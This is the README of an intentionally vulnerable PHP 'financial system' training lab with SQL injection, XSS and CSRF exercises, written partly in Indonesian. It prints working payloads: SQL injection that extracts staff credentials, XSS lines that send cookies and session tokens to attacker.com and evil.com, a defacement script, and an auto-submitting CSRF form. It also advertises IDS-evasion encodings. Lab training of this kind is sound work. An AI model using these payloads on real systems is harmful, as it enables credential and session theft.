 Financial System DVWA - Vulnerable Financial Management System

[![GitHub](https://img.shields.io/badge/GitHub-Nadzare%2Fdvwa--system-blue?logo=github)](https://github.com/Nadzare/dvwa-system)
[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?logo=docker)](https://www.docker.com/)
[![PHP](https://img.shields.io/badge/PHP-8.2-777BB4?logo=php)](https://www.php.net/)
[![License](https://img.shields.io/badge/License-Educational-green.svg)](LICENSE)

Aplikasi sistem keuangan yang sengaja vulnerable untuk pelatihan penetration testing dalam konteks financial applications. Dibuat dari nol dengan fokus 4 vulnerability utama:
- SQL Injection (error-based + blind) - Pencarian transaksi keuangan
- XSS Reflected - Laporan keuangan
- XSS Stored - Catatan transaksi
- CSRF - Ubah PIN transaksi

🔗 **Repository:** https://github.com/Nadzare/dvwa-system

## ⚡ NEW! IDS Evasion Support untuk Financial System

**Financial System DVWA sekarang menerima payload dengan encoding untuk bypass IDS!**

Testing dalam konteks:
- ✅ SQL Injection pada pencarian transaksi keuangan
- ✅ XSS pada form laporan dan catatan transaksi
- ✅ CSRF pada perubahan PIN transaksi

✅ Multi-level URL encoding (`%27`, `%2527`, `%252527`)  
✅ HTML entity encoding (`&#39;`, `&lt;script&gt;`)  
✅ Unicode escapes (`\u0027`)  
✅ Comment injection (`UNI/**/ON`)  
✅ Alternative syntax (SVG, IMG, alternative events)

📖 **Testing Guide:** [TESTING_EVASION.md](TESTING_EVASION.md)  
📖 **40+ Payload Evasion:** [EVASION_PAYLOADS.md](EVASION_PAYLOADS.md)

## 📚 Documentation

### 🚀 Setup Guides
- **[QUICK_START.md](QUICK_START.md)** - ⭐ Pilih environment (Docker/XAMPP/Laragon) dengan cepat
- **[SETUP_GITHUB.md](SETUP_GITHUB.md)** - Panduan lengkap setup dari GitHub clone (semua environment)
- **[SETUP_XAMPP.md](SETUP_XAMPP.md)** - Troubleshooting khusus XAMPP (port conflict, database, dll)
- **[NETWORK_SETUP.md](NETWORK_SETUP.md)** - Setup networking untuk akses dari Kali VM

### 🎯 Payload & Testing
- **[PAYLOADS.md](PAYLOADS.md)** - Panduan lengkap payload SQLi, XSS, CSRF dengan contoh praktis
- **[QUICK_PAYLOADS.md](QUICK_PAYLOADS.md)** - Quick reference card untuk copy-paste payload
- **[test_payloads.ps1](test_payloads.ps1)** - Script PowerShell untuk testing otomatis (Windows)
- **[test_payloads.sh](test_payloads.sh)** - Script Bash untuk testing otomatis (Linux/Kali)
- **[csrf_attack.html](csrf_attack.html)** - HTML file untuk CSRF attack simulation
- **[csrf_iframe_attack.html](csrf_iframe_attack.html)** - Silent CSRF attack via iframe

### 🛡️ IDS Evasion Research
- **[EVASION_SNORT3_SURICATA.md](EVASION_SNORT3_SURICATA.md)** - ⭐⭐ Payload evasion untuk rules spesifik kamu!
- **[CHANGELOG_EVASION_SUPPORT.md](CHANGELOG_EVASION_SUPPORT.md)** - ⭐ What's new in v2.0 - Evasion support!
- **[TESTING_EVASION.md](TESTING_EVASION.md)** - ⭐ Testing guide untuk evasion payloads
- **[EVASION_PAYLOADS.md](EVASION_PAYLOADS.md)** - 40+ teknik bypass IDS (Suricata & Snort3)
- **[LAPORAN_IDS_EVASION.md](LAPORAN_IDS_EVASION.md)** - Laporan lengkap BAB I-V (format akademik)
- **[TABEL_REKAP_TESTING.md](TABEL_REKAP_TESTING.md)** - 9 tabel hasil testing IDS

## ⚡ Quick Start

### 🐳 OPSI 1: Menggunakan Docker (Recommended)

**Prerequisites:**
- Docker & Docker Compose installed
- Port 8000 available
- Git (untuk clone)

**Setup (5 Menit):**

1. **Clone Repository**
   ```bash
   git clone https://github.com/Nadzare/dvwa-system.git
   cd dvwa-system
   ```

2. **Start Docker Container**
   ```bash
   docker compose up -d
   ```

3. **Setup Database (First Time Only)**
   - Buka browser: http://localhost:8000
   - Klik tombol **"📦 Setup Database"** di login page
   - Database akan dibuat otomatis
   - Login dengan kredensial default

4. **Login**
   ```
   Username: admin
   Password: admin123
   Role: Financial Administrator
   ```

### Akses Aplikasi
- **Indonesian:** http://localhost:8000/login_id.php (Sistem Keuangan)
- **English:** http://localhost:8000/login.php (Financial System)

**🎉 No manual database setup needed!** Cukup klik tombol di login page.

**Stop:**
```bash
docker-compose down
```

---

### 📦 OPSI 2: Menggunakan XAMPP/Laragon (Tanpa Docker)

**Prerequisites:**
- XAMPP atau Laragon installed
- Apache + MySQL/MariaDB running
- Git (untuk clone)

**Setup (5 Menit):**

1. **Clone Repository**
   ```bash
   git clone https://github.com/kendikadimas/dvwa.git
   cd dvwa
   ```

2. **Copy ke Web Root**
   ```bash
   # XAMPP
   xcopy /E /I app C:\xampp\htdocs\dvwa
   
   # Laragon
   xcopy /E /I app C:\laragon\www\dvwa
   ```

3. **Edit Config (HANYA untuk XAMPP)**
   
   Edit `config.php`, ubah baris 5-6:
   ```php
   // Dari:
   define('DB_USER', getenv('DB_USER') ?: 'dvwa');
   define('DB_PASSWORD', getenv('DB_PASSWORD') ?: 'dvwa123');
   
   // Jadi:
   define('DB_USER', getenv('DB_USER') ?: 'root');
   define('DB_PASSWORD', getenv('DB_PASSWORD') ?: '');  // kosong untuk XAMPP
   ```
   
   **Atau copy config siap pakai:**
   ```bash
   copy app\config_xampp_example.php app\config.php
   ```

4. **Start Apache & MySQL**
   - XAMPP: Buka XAMPP Control Panel → Start Apache & MySQL
   - Laragon: Start All

5. **Buka Browser**
   ```
   # XAMPP
   http://localhost/dvwa/login.php
   
   # Laragon
   http://localhost/dvwa/login.php
   ```

6. **Klik "📦 Create/Reset DB"**
   Database dibuat otomatis!

7. **Login**
   ```
   Username: admin
   Password: admin123
   ```

**📖 Panduan Lengkap XAMPP:** [SETUP_XAMPP.md](SETUP_XAMPP.md)

---

### 📊 Perbandingan Environment

| Fitur | Docker | XAMPP | Laragon |
|-------|--------|-------|---------|
| Setup Speed | ⚡ Fast (5 min) | ⚡ Fast (5 min) | ⚡ Fast (5 min) |
| Config Edit | ❌ No | ✅ Yes (root/empty) | ❌ No |
| Port Default | 8000 | 80 | 80 |
| Isolation | ✅ Yes | ❌ No | ❌ No |
| Portable | ✅ Yes | ⚠️ Medium | ⚠️ Medium |
| Auto DB Setup | ✅ Yes | ✅ Yes | ✅ Yes |
| Reset DB | ✅ Easy | ✅ Easy | ✅ Easy |

**Rekomendasi:**
- 🐳 **Docker:** Untuk isolation dan portability
- 📦 **XAMPP:** Sudah familiar dengan XAMPP
- 🚀 **Laragon:** Development speed dan simplicity

**Semua opsi support auto-create database!** Tinggal klik tombol di login page.

---

## 🚀 Deploy to Railway

### Prerequisites
- GitHub account
- Railway account (free tier tersedia)

### Steps

1. **Push ke GitHub**
```bash
git add .
git commit -m "Deploy to Railway"
git push origin main
```

2. **Buka Railway Dashboard**
   - Pergi ke https://railway.app
   - Login dengan GitHub

3. **New Project → Deploy from GitHub**
   - Pilih `dvwalast` repository
   - Railway akan otomatis detect docker-compose.yml

4. **Configure Environment (opsional)**
   - Railway auto-detect dari docker-compose.yml
   - Atau set manual: DB_HOST, DB_USER, DB_PASSWORD, DB_NAME

5. **Deploy**
   - Tunggu hingga status "Live" (3-5 menit)
   - Klik "Open App"

6. **Access**
   ```
   https://dvwalast-prod.up.railway.app/login_id.php
   Username: admin
   Password: admin123
   ```

**[Detailed Railway Guide](./RAILWAY_DEPLOYMENT.md)**

---

## 🧪 Lab Vulnerabilities - Financial System Context

### 1. SQL Injection (SQLi) - Pencarian Transaksi
**Lokasi:** `/sqli_id.php` (Indonesian) atau `/sqli.php` (English)

**Skenario:** Sistem pencarian transaksi keuangan berdasarkan invoice number atau transaction ID

**Exploitation:**
```
1 OR 1=1                  → Tampilkan semua transaksi keuangan
1 UNION SELECT 1,2,3,4    → Test columns
1 UNION SELECT username, password, 3, created_at FROM users  → Extract kredensial staff finance
' OR amount > 1000000 --  → Cari transaksi besar
```

**Error-based & Blind SQLi supported**  
**Impact:** Data breach rekening, transaksi, kredensial pegawai keuangan

### 2. XSS - Reflected (Laporan Keuangan)
**Lokasi:** `/xss_reflected_id.php`

**Skenario:** Submit dan preview laporan keuangan sebelum dikirim

**Exploitation:**
```
<script>alert('Laporan Palsu')</script>
<img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">
<svg onload="window.location='http://attacker.com/steal?data='+btoa(document.body.innerHTML)">
```

**Payload tercermin di URL - bisa untuk phishing fake financial report**

### 3. XSS - Stored (Catatan Transaksi)
**Lokasi:** `/xss_stored_id.php`

**Skenario:** Staff finance menambahkan catatan/memo pada transaksi yang bisa dilihat semua user

**Exploitation:**
```
<script>alert('Transaksi Mencurigakan')</script>     → Execute untuk semua staff
<img src=x onerror="fetch('http://evil.com?token='+localStorage.getItem('sessionToken'))">  → Steal session
<svg onload="document.body.innerHTML='<h1>Sistem Down untuk Maintenance</h1>'">  → Defacement
```

**Payload disimpan di database - execute otomatis saat staff membuka halaman catatan transaksi**

**🔄 Reset Database Button tersedia untuk clear malicious notes**

### 4. CSRF - Change Transaction PIN
**Lokasi:** `/csrf_id.php`

**Skenario:** Ubah PIN untuk otorisasi transaksi keuangan tanpa verifikasi CSRF token

**Exploitation:**
```html
<!-- Attacker's malicious page -->
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

**Tidak ada CSRF token - PIN dapat diubah jika admin mengklik link berbahaya**  
**Impact:** Account takeover, unauthorized transaction approval

---

## 📁 Project Structure - Financial System

```
dvwa-system/
├── app/
│   ├── config.php              # Database config
│   ├── login.php               # English login (vulnerable SQLi)
│   ├── login_id.php            # Indonesian login - Sistem Keuangan
│   ├── dashboard.php           # English dashboard - Financial Admin
│   ├── dashboard_id.php        # Indonesian dashboard - Dashboard Keuangan
│   ├── sqli.php                # English SQLi lab - Transaction Search
│   ├── sqli_id.php             # Indonesian SQLi lab - Pencarian Transaksi
│   ├── xss_reflected.php       # English reflected XSS - Financial Report
│   ├── xss_reflected_id.php    # Indonesian reflected XSS - Laporan Keuangan
│   ├── xss_stored.php          # English stored XSS - Transaction Notes
│   ├── xss_stored_id.php       # Indonesian stored XSS - Catatan Transaksi
│   ├── csrf.php                # English CSRF lab - Change PIN
│   ├── csrf_id.php             # Indonesian CSRF lab - Ubah PIN Transaksi
│   ├── reset_db.php            # Database reset handler
│   ├── logout.php              # Logout handler
│   └── index.php               # Main entry point
├── db/
│   └── init.sql                # Database initialization
├── docker-compose.yml          # Docker Compose config
├── Dockerfile                  # PHP + Apache config
├── .gitignore
├── railway.json               # Railway deployment config
├── RAILWAY_DEPLOYMENT.md      # Detailed Railway guide
└── README.md
```

---

## 🔐 Default Credentials - Financial System

**Administrator (Full Access):**
```
Username: admin
Password: admin123
Role: Financial Administrator
Access: All financial modules, transaction approval, reports
```

**Staff (Limited Access):**
```
Username: user
Password: user123
Role: Finance Staff
Access: View transactions, add notes
```

---

## 🛠️ Tech Stack

- **Backend:** PHP 8.2
- **Database:** MariaDB 11
- **Web Server:** Apache
- **Container:** Docker & Docker Compose
- **Hosting:** Railway.app (recommended)

---

## ⚠️ Security Warning - Financial System Context

**This Financial System is INTENTIONALLY VULNERABLE!**

- ✅ Gunakan hanya untuk training & learning security dalam konteks financial applications
- ✅ Jangan deploy ke production atau gunakan dengan data finansial real
- ✅ Jangan gunakan untuk exploit real financial/banking systems
- ✅ Training ini mensimulasikan kelemahan umum dalam aplikasi keuangan
- ⚠️ Real financial systems harus implement: encryption, 2FA, audit logs, compliance standards

**Learning Objectives:**
- Memahami vulnerability dalam financial web applications
- Praktek secure coding untuk sistem keuangan
- Awareness terhadap impact finansial dari security breach
- Testing IDS/IPS rules untuk financial transaction patterns

---

## 📚 Learning Resources - Financial Security

### General Web Security:
1. **OWASP Top 10** - https://owasp.org/www-project-top-ten/
2. **PortSwigger Web Security Academy** - https://portswigger.net/web-security
3. **HackTheBox** - https://www.hackthebox.com
4. **TryHackMe** - https://tryhackme.com

### Financial & Banking Security:
5. **PCI DSS Compliance** - https://www.pcisecuritystandards.org/
6. **OWASP Financial Services** - https://owasp.org/www-industry/financial/
7. **Financial Sector Cybersecurity** - NIST Framework
8. **ISO 27001** - Information Security Management

### Recommended Testing Path:
1. Start dengan SQL Injection pada transaction search
2. Test XSS pada financial reports dan notes
3. Simulate CSRF attack pada PIN change
4. Practice IDS evasion dengan financial payloads
5. Analyze impact pada financial data integrity

---

## 📝 License

Educational Purpose Only - Use responsibly!

---

## 🤝 Contributing

Found bugs atau ingin improve? Feel free to fork & contribute!

---

**Happy Hacking! 🔥**
